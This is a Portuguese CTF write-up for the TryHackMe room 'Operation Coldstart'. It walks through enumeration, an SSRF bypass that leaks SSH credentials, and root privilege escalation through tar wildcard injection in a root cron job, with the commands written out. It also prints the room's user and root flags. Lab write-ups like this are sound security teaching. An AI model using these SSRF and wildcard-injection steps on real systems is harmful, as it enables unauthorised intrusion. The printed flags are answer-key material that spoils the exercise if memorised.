# ❄️ Operation Coldstart — CTF Writeup
### TryHackMe | Penetration Testing / Web Exploitation

---

| **Analista**          | Mauricio Robert                                              |
|-----------------------|--------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                            |
| **Data do Relatório** | 25/06/2026                                                   |
| **Data do Incidente** | 25/06/2026                                                   |
| **Classificação**     | CONFIDENCIAL                                                 |
| **Ferramentas**       | Nmap · Gobuster · FTP · CyberChef · curl · Gemini AI        |
| **Alvo**              | `10.67.188.131` — Volt Labs (staging)                        |

---

## 🔍 Resumo Executivo

O alvo é um servidor Linux Ubuntu 24.04 expondo três serviços: **FTP anônimo (21)**, **SSH (22)** e uma aplicação web **Flask/Gunicorn (80)** chamada *URL Preview Service* (Volt Labs). A aplicação web apresenta uma vulnerabilidade de **SSRF (Server-Side Request Forgery)** que permite acesso à rota administrativa `/admin/notes`, protegida por restrição de IP local. Essa rota exibe credenciais SSH internas (`webdev / V0ltLabs#summer`), permitindo acesso inicial à máquina. Para a escalada de privilégios, explorou-se um **cronjob root** que executa `tar` periodicamente no diretório `/opt/backups`, usando a técnica de **tar wildcard injection** para obter shell root.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta    | Finalidade                                                                  |
|---------------|-----------------------------------------------------------------------------|
| **Nmap**      | Enumeração de portas, serviços e versões (`-A -sV -sC`)                     |
| **Gobuster**  | Descoberta de diretórios e endpoints web ocultos                            |
| **FTP**       | Acesso anônimo ao servidor vsftpd para download de `backup.tar.gz`          |
| **curl**      | Requisições HTTP manuais para exploração da vulnerabilidade SSRF            |
| **CyberChef** | Análise auxiliar de payloads e decodificações                               |
| **Gemini AI** | Apoio à análise do código-fonte da aplicação e raciocínio sobre a SSRF      |

---

## 🔎 Fase 1 — Reconhecimento e Enumeração

### Nmap — Varredura de Portas

```bash
nmap -A -sV -sC -T5 10.67.188.131
```

A varredura revelou três portas abertas:

| Porta | Serviço  | Versão / Detalhes                                    |
|-------|----------|------------------------------------------------------|
| 21    | FTP      | vsftpd 3.0.5 — **login anônimo permitido**, diretório `pub` |
| 22    | SSH      | OpenSSH 9.6p1 Ubuntu                                |
| 80    | HTTP     | Gunicorn — título: *URL Preview - Volt Labs*         |

**Descobertas críticas no Nmap:**
- FTP anônimo expõe diretório `pub` com conteúdo acessível sem autenticação.
- A aplicação web é identificada como *URL Preview Service* rodando sobre Gunicorn (Flask).

![Nmap](/CTFs/ColdStart/images/Nmap_Result.png)

---

### Gobuster — Enumeração de Diretórios Web

```bash
gobuster dir -u http://10.67.188.131 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100
```

```
admin   (Status: 308) [Size: 241] [--> http://10.67.188.131/admin/]
```

O Gobuster identificou o endpoint `/admin/` redirecionando para `/admin/`. Ao tentar acessar diretamente pelo navegador, a rota retorna erro — ela está protegida para aceitar requisições apenas de `127.0.0.1`.

---

### FTP Anônimo — Download do Código-Fonte

```bash
ftp 10.67.188.131
# login: anonymous | senha: (enter)
ftp> cd pub
ftp> ls
# -rw-r--r-- 1 ftp ftp 2446 May 09 23:14 backup.tar.gz
ftp> get backup.tar.gz
ftp> exit
tar -xzvf backup.tar.gz
```

O arquivo `backup.tar.gz` contém o código-fonte completo da aplicação web:

```
voltlabs-preview/
├── README.md
├── requirements.txt
└── app.py
```

**`requirements.txt`:**
```
flask
requests
gunicorn
```
![FTP](/CTFs/ColdStart/images/FTP_GET.png)

---

### Análise do Código-Fonte — app.py

Trecho relevante de `app.py`:

```python
from flask import Flask, request, abort
from urllib.parse import urlparse
import html
import requests

app = Flask(__name__)

# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}

...

@app.route("/admin/notes")
def admin_notes():
    if not request.remote_addr.startswith("127."):
        abort(403)
    ...

@app.route("/preview")
def preview():
    url = request.args.get("url", "")
    host = urlparse(url).hostname
    if host not in ALLOWED_HOSTS:
        abort(403)
    resp = requests.get(url)
    return render(resp.text)
```

**Vulnerabilidade identificada — SSRF:**
- A rota `/admin/notes` só responde a requisições de `127.x.x.x`.
- A rota `/preview` aceita qualquer URL cujo hostname seja `kestrel.thm`.
- O comentário no próprio código confirma: *"Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box"*.
- Logo, ao requisitar `http://kestrel.thm/admin/notes` via `/preview`, o servidor faz a requisição para si mesmo (`127.0.0.1`), bypassando a proteção.

![.py](/CTFs/ColdStart/images/Function_Code.png)

---

## 💥 Fase 2 — Exploração (SSRF → Credenciais SSH)

### SSRF via URL Preview Service

![Site Exploration](/CTFs/ColdStart/images/Site_Exploration.png)

Com o entendimento do código-fonte (apoiado pela análise do Gemini AI):

Acessou-se a aplicação em `http://10.67.188.131` e inseriu-se a URL maliciosa no campo de input:

```
http://kestrel.thm/admin/notes
```

A aplicação fez a requisição interna de `127.0.0.1` → `/admin/notes`, retornando o conteúdo da nota administrativa:

![SSRF — Credenciais SSH](/CTFs/ColdStart/images/SSRF_SSH_USER_PASS.png)

```
==== INTERNAL ====
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

---

## 🔑 Fase 3 — Acesso Inicial (SSH)

```bash
ssh webdev@10.67.188.131
# Password: V0ltLabs#summer
```

Após autenticação bem-sucedida:

```bash
webdev@coldstart:~$ ls
user.txt

webdev@coldstart:~$ cat user.txt
THM{96dc7bd50d2fb98fcece01560788b5ab}
```
![User Flag](/CTFs/ColdStart/images/User_Flag.png)

> **🚩 User Flag: `THM{96dc7bd50d2fb98fcece01560788b5ab}`**

---

## ⬆️ Fase 4 — Escalada de Privilégios (Tar Wildcard Injection)

### Enumeração Pós-Exploração

```bash
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"
```

![Enumeração de Privilégios](Enumeration_Privilege_Escalation.png)

Arquivos graváveis identificados:
- `/opt/backups/.keep` — diretório de backups, proprietário `webdev`

```bash
ls -la /opt/backups/
# drwxrwx--- 2 webdev webdev 4096 May 9 23:14 .
# drwxr-x 4 root   root   4096 May 9 23:14 ..
# -rw-r--r-- 1 webdev webdev 12 May 9 23:14 .keep

cat /etc/cron.d/voltlabs-backup
# Volt Labs staging backup - runs as root
# SHELL=/bin/bash
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# * * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

**Vulnerabilidade:** O cronjob root executa `tar czf ... *` com wildcard no diretório `/opt/backups`. Como o usuário `webdev` tem permissão de escrita nesse diretório, é possível criar arquivos com nomes que o `tar` interpreta como flags de linha de comando — técnica conhecida como **tar wildcard injection**.

---

### Exploração — Tar Wildcard Injection

![Enumetacao Escalacao de Privilegios](/CTFs/ColdStart/images/Enumeration_Privilege_Escalation.png)

```bash
cd /opt/backups

# 1. Criar script que atribui SUID ao /bin/bash
echo "chmod +s /bin/bash" > shell.sh
chmod +x shell.sh

# 2. Criar "arquivos-isca" interpretados como flags pelo tar
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# 3. Aguardar o cron executar (até 1 min) e verificar o SUID
ls -l /bin/bash
# -rwsr-sr-x 1 root root 1446024 Mar 31 2024 /bin/bash

# 4. Invocar bash preservando privilégios de root
/bin/bash -p
```

![Escalada de Privilégios Completa](/CTFs/ColdStart/images/Privilege_Escalation_Complete.png)

O shell retornado é `bash-5.2#` — prompt de root confirmado.

---

## 🏁 Fase 5 — Root Flag

```bash
bash-5.2# find / -name "flag.txt" 2>/dev/null
# /root/flag.txt

bash-5.2# cat /root/flag.txt
THM{e6ee84a483d67ade06936fcfd1433e8a}
```

![Final Flag](/CTFs/ColdStart/images/Final_Flag.png)

> **🚩 Root Flag: `THM{e6ee84a483d67ade06936fcfd1433e8a}`**

---

## ⛓ Cadeia de Ataque (Attack Chain)

```
[1] RECONHECIMENTO
    Nmap → 3 portas abertas: FTP(21) SSH(22) HTTP(80)
    Gobuster → /admin/ descoberto (acesso restrito a 127.0.0.1)
    ↓
[2] COLETA DE INFORMAÇÕES
    FTP anônimo → download de backup.tar.gz → código-fonte app.py
    Análise do código → SSRF identificada em /preview + ALLOWED_HOSTS = kestrel.thm
    kestrel.thm resolve para 127.0.0.1 via /etc/hosts (comentário no código)
    ↓
[3] EXPLORAÇÃO — SSRF
    http://10.67.188.131/preview?url=http://kestrel.thm/admin/notes
    Servidor requisita /admin/notes a si mesmo (127.0.0.1) → bypass da restrição IP
    Conteúdo retornado: credenciais SSH webdev / V0ltLabs#summer
    ↓
[4] ACESSO INICIAL
    ssh webdev@10.67.188.131 (V0ltLabs#summer)
    User Flag: THM{96dc7bd50d2fb98fcece01560788b5ab}
    ↓
[5] ESCALADA DE PRIVILÉGIOS
    find → /opt/backups gravável por webdev
    /etc/cron.d/voltlabs-backup → cronjob root: tar czf ... * (wildcard em /opt/backups)
    Tar wildcard injection: --checkpoint-action=exec=sh shell.sh → chmod +s /bin/bash
    /bin/bash -p → shell root
    ↓
[6] ROOT
    Root Flag: THM{e6ee84a483d67ade06936fcfd1433e8a}
```

---

## 🗺 Mapeamento MITRE ATT&CK

| ID          | Técnica                                          | Tática               |
|-------------|--------------------------------------------------|----------------------|
| T1595.001   | Active Scanning: Scanning IP Blocks              | Reconnaissance       |
| T1046       | Network Service Discovery (Nmap)                 | Discovery            |
| T1190       | Exploit Public-Facing Application (SSRF)         | Initial Access       |
| T1083       | File and Directory Discovery (Gobuster/FTP)      | Discovery            |
| T1552.001   | Credentials In Files (admin/notes via SSRF)      | Credential Access    |
| T1021.004   | Remote Services: SSH                             | Lateral Movement     |
| T1053.003   | Scheduled Task/Job: Cron                         | Privilege Escalation |
| T1574       | Hijack Execution Flow (tar wildcard injection)   | Privilege Escalation |
| T1548.001   | Abuse Elevation Control Mechanism: SUID          | Privilege Escalation |

---

## 🚨 Indicadores e Artefatos

| Tipo                    | Valor                             | Contexto                                              |
|-------------------------|-----------------------------------|-------------------------------------------------------|
| **IP Alvo**             | `10.67.188.131`                   | Servidor Volt Labs — staging                          |
| **FTP**                 | vsftpd 3.0.5 — porta 21           | Login anônimo permitido; expõe `backup.tar.gz`        |
| **SSH**                 | OpenSSH 9.6p1 — porta 22          | Acesso com credenciais obtidas via SSRF               |
| **Web App**             | Gunicorn/Flask — porta 80         | *URL Preview Service* — vulnerável a SSRF             |
| **Arquivo Vazado**      | `backup.tar.gz` (FTP/pub)         | Contém código-fonte completo da aplicação             |
| **SSRF Endpoint**       | `/preview?url=http://kestrel.thm/admin/notes` | Bypass da restrição de IP local         |
| **Hostname Interno**    | `kestrel.thm → 127.0.0.1`        | Configurado em `/etc/hosts` no servidor               |
| **Credenciais SSH**     | `webdev / V0ltLabs#summer`        | Expostas em `/admin/notes` via SSRF                   |
| **Cronjob Vulnerável**  | `/etc/cron.d/voltlabs-backup`     | Executa `tar czf ... *` como root em `/opt/backups`   |
| **Técnica PrivEsc**     | Tar wildcard injection            | `--checkpoint-action=exec=sh shell.sh` → SUID bash    |
| **User Flag**           | `THM{96dc7bd50d2fb98fcece01560788b5ab}` | `/home/webdev/user.txt`                    |
| **Root Flag**           | `THM{e6ee84a483d67ade06936fcfd1433e8a}` | `/root/flag.txt`                           |

---

## ✅ Resumo das Flags

| # | Etapa                | Flag                                         |
|---|----------------------|----------------------------------------------|
| 1 | **User Flag**        | `THM{96dc7bd50d2fb98fcece01560788b5ab}`      |
| 2 | **Root Flag**        | `THM{e6ee84a483d67ade06936fcfd1433e8a}`      |

---

## 📚 Referências

- [MITRE ATT&CK — T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK — T1053.003 Scheduled Task: Cron](https://attack.mitre.org/techniques/T1053/003/)
- [OWASP — Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [TryHackMe — Operation Coldstart](https://tryhackme.com/room/operationcoldstart)
- [Nmap](https://nmap.org/) | [Gobuster](https://github.com/OJ/gobuster) | [vsftpd](https://security.appspot.com/vsftpd.html)

---